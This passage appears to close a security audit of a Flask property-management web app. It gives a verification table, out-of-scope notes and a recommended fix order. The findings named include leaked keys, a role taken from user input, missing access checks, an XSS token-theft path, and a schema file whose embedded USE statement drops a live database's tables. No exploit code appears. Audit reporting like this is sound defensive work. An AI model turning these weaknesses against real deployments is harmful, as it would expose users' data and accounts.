| **README install path works as written** | Reproduced Steps 4→6 on scratch DB `pgc_schema_test` (import `docs/pg_connect_schema.sql` → `flask db upgrade` → `seed.py`): seed completed, DB dropped afterwards | **VERIFIED (clean)** |
| `docs/pg_connect_schema.sql` and migrations produce equivalent schemas | Column-set diff = 0 missing/extra columns; 240 diff lines are `DEFAULT`/`ON UPDATE` clauses only | VERIFIED (cosmetic) |
| A misconfigured DB produces errors, not empty data | Simulated dead port 3399: `/api/properties/search` and `/api/auth/login` → `503 DATABASE_CONNECTION_ERROR`, `/api/health` → `unreachable: (2003, ...)` | VERIFIED |
| **`docs/pg_connect_schema.sql` silently wipes an existing database** | Imported into `pgc_schema_test`; the embedded `USE pg_connect_db` redirected it; binlog shows 26 `DROP TABLE IF EXISTS` + `CREATE TABLE`, zero `DELETE`/`TRUNCATE`; live DB came back empty with tables intact and `200`s served | **VERIFIED** |

---

## Out of scope / not exercised

- Frontend behaviour under a real browser (Playwright/ZAP) — XSS execution inferred from the `innerHTML`
  sink, not observed executing.
- Load/performance testing at scale (AUDIT-018 is analytical).
- Docker/CI deployment posture (no image or workflow in the repo).
- `report_service.py` / `finance_service.py` numerical correctness (pandas/reportlab output shapes) —
  invoices and Excel rendered successfully but totals were not reconciled against the ledger.

## Recommended fix order

1. AUDIT-001 (rotate keys, untrack `.env`) — everything else is amplified by it.
2. AUDIT-006 (role from user input) + AUDIT-002/003/004 (add `verify_property_access` to every
   property-scoped route) — one shared service-level helper, then per-route tests.
3. AUDIT-005 (escaping helper in the frontend) + AUDIT-014 (CSP) — the XSS is a direct token-theft path.
4. AUDIT-007 (revocation/logout), AUDIT-008 (lock the maintenance endpoint), AUDIT-009 (derive
   `booking_id` server-side), AUDIT-012 (one-line import fix + test).
5. AUDIT-010/011/013/015/016/017/018 — hardening and correctness cleanup.
